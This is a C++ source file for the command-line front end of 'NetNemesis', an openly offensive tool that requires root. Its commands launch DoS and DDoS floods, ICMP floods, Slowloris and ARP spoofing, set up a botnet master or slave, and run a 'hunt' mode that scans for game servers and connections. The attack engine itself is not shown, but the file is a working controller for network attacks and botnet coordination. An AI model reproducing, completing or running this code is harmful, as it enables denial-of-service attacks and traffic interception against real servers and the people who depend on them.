#include "netnemesis.h"
#include <sstream>

std::atomic<bool> g_running(true);
std::atomic<bool> g_is_master(false);
std::atomic<bool> g_is_slave(false);
std::atomic<bool> g_auto_hunt(false);
std::mutex g_print_mutex;

bool checkRoot() {
    if (getuid() != 0) {
        std::cerr << "\033[31m[ERROR] NetNemesis requires root privileges!\033[0m" << std::endl;
        std::cerr << "Run with: sudo ./netnemesis" << std::endl;
        return false;
    }
    return true;
}

NetNemesisCLI::NetNemesisCLI() : attack_engine(&botnet) {}

void NetNemesisCLI::showBanner() {
    const char* banner = R"(
      ::::    ::: :::::::::: ::::::::::: ::::    ::: ::::::::::   :::   :::   :::::::::: :::::::: ::::::::::: :::::::: 
     :+:+:   :+: :+:            :+:     :+:+:   :+: :+:         :+:+: :+:+:  :+:       :+:    :+:    :+:    :+:    :+: 
    :+:+:+  +:+ +:+            +:+     :+:+:+  +:+ +:+        +:+ +:+:+ +:+ +:+       +:+           +:+    +:+         
   +#+ +:+ +#+ +#++:++#       +#+     +#+ +:+ +#+ +#++:++#   +#+  +:+  +#+ +#++:++#  +#++:++#++    +#+    +#++:++#++   
  +#+  +#+#+# +#+            +#+     +#+  +#+#+# +#+        +#+       +#+ +#+              +#+    +#+           +#+    
 #+#   #+#+# #+#            #+#     #+#   #+#+# #+#        #+#       #+# #+#       #+#    #+#    #+#    #+#    #+#     
###    #### ##########     ###     ###    #### ########## ###       ### ########## ######## ########### ########       

)";
    std::cout << "\033[35m" << banner << "\033[0m" << std::endl;
    std::cout << "\033[33m    Version 3.0 - Type 'help' for commands\033[0m" << std::endl;
}

void NetNemesisCLI::botnetInteractiveMenu() {
    std::cout << "\n\033[36m[BOTNET CONFIGURATION]\n";
    std::cout << "1. MASTER - Become master\n";
    std::cout << "2. SLAVE - Connect to master\n";
    std::cout << "3. BACK - Return to menu\n";
    std::cout << "[END]\033[0m\n";
    std::cout << "Choice: ";
    
    int choice;
    std::cin >> choice;
    std::cin.ignore();
    
    if (choice == 1) {
        std::cout << "Enter MASTER port [default: 6666]: ";
        std::string port_str;
        std::getline(std::cin, port_str);
        int port = port_str.empty() ? DEFAULT_BOTNET_PORT : std::stoi(port_str);
        botnet.startMaster(port);
    } else if (choice == 2) {
        std::cout << "Enter MASTER IP: ";
        std::string ip;
        std::getline(std::cin, ip);
        std::cout << "Enter MASTER port [default: 6666]: ";
        std::string port_str;
        std::getline(std::cin, port_str);
        int port = port_str.empty() ? DEFAULT_BOTNET_PORT : std::stoi(port_str);
        botnet.startSlave(ip, port);
    }
}

void NetNemesisCLI::run() {
    Utils::clearScreen();
    showBanner();
    
    std::string input;
    while (g_running) {
        std::cout << "\033[32mroot@NetNemesis\033[0m";
        if (g_is_master) std::cout << "\033[31m[MASTER]\033[0m";
        if (g_is_slave) std::cout << "\033[33m[SLAVE]\033[0m";
        if (g_auto_hunt) std::cout << "\033[35m[HUNT]\033[0m";
        std::cout << ":# ";
        
        std::getline(std::cin, input);
        if (input.empty()) continue;
        
        auto args = Utils::split(input, ' ');
        std::string cmd = args[0];
        
        if (cmd == "clear") {
            Utils::clearScreen();
            showBanner();
        }
        else if (cmd == "botnet") {
            botnetInteractiveMenu();
        }
        else if (cmd == "dos" && args.size() >= 3) {
            attack_engine.executeDOS(args[1], std::stoi(args[2]), true);
        }
        else if (cmd == "ddos" && args.size() >= 3) {
            int bots = (args.size() > 3) ? std::stoi(args[3]) : 10;
            attack_engine.executeDDOS(args[1], std::stoi(args[2]), bots);
        }
        else if (cmd == "scan") {
            scanner.start();
        }
        else if (cmd == "scan_stop") {
            scanner.stop();
            Utils::logInfo("Scanner stopped - Returning to the main menu");
        }
        else if (cmd == "hunt") {
            g_auto_hunt = !g_auto_hunt;
            Utils::logWarning(g_auto_hunt ? "HUNT MODE: ON" : "HUNT MODE: OFF");
            if (g_auto_hunt) scanner.start();
        }
        else if (cmd == "servers") {
            auto servers = scanner.getServers();
            Utils::logInfo("Servers found: " + std::to_string(servers.size()));
            for (const auto &s : servers) {
                std::cout << "  - " << s.first << ":" << s.second << std::endl;
            }
        }
        else if (cmd == "connections") {
            auto conns = scanner.getConnections();
            Utils::logInfo("Local game connections: " + std::to_string(conns.size()));
            for (const auto &c : conns) {
                std::cout << "  - " << c.first << ":" << c.second << " (" << getGameName(c.second) << ")" << std::endl;
            }
        }
        else if (cmd == "exit" || cmd == "quit") {
            g_running = false;
            botnet.stop();
            scanner.stop();
            Utils::logInfo("Goodbye!");
        }
        else if (cmd == "fingerprint" && args.size() >= 3) {
            ServiceFingerprinter fp;
            auto info = fp.fingerprint(args[1], std::stoi(args[2]));
            Utils::logSuccess("Service detected:");
            std::cout << "  Name: " << info.name << std::endl;
            std::cout << "  Version: " << info.version << std::endl;
            std::cout << "  Info: " << info.extra_info << std::endl;
        }
        else if (cmd == "icmp" && args.size() >= 2) {
            int packets = (args.size() > 2) ? std::stoi(args[2]) : 10000;
            attack_engine.executeICMPFlood(args[1], packets);
        }
        else if (cmd == "slowloris" && args.size() >= 3) {
            int conn = (args.size() > 3) ? std::stoi(args[3]) : 1000;
            attack_engine.executeSlowloris(args[1], std::stoi(args[2]), conn);
        }
        else if (cmd == "arp" && args.size() >= 3) {
            attack_engine.executeARPSpoof(args[1], args[2]);
        }
        else if (cmd == "stop_slowloris") {
            Utils::logInfo("Stopping Slowloris...");
            attack_engine.stopSlowloris();
        }
        else if (cmd == "help") {
            std::cout << "\033[36m[AVAILABLE COMMANDS]\n";
            std::cout << "basic attacks:" << std::endl;
            std::cout << "  dos <ip> <port>" << std::endl;
            std::cout << "  ddos <ip> <port> [n]" << std::endl;
            std::cout << "  icmp <ip> [packets]" << std::endl;
            std::cout << "  slowloris <ip> <port> [n]" << std::endl;
            std::cout << "  arp <target> <gateway>" << std::endl;
            std::cout << "reconnaissance:" << std::endl;
            std::cout << "  fingerprint <ip> <port>" << std::endl;
            std::cout << "  scan" << std::endl;
            std::cout << "  scan_stop" << std::endl;
            std::cout << "  servers" << std::endl;
            std::cout << "  connections" << std::endl;
            std::cout << "botnet:" << std::endl;
            std::cout << "  botnet" << std::endl;
            std::cout << "  hunt" << std::endl;
            std::cout << "control:" << std::endl;
            std::cout << "  clear" << std::endl;
            std::cout << "  stop_slowloris" << std::endl;
            std::cout << "  exit" << std::endl;
        }
        else {
            Utils::logError("Unknown command: " + cmd);
        }
    }
}

int main() {
    if (!checkRoot()) {
        return 1;
    }
    
    NetNemesisCLI cli;
    cli.run();
    
    return 0;
}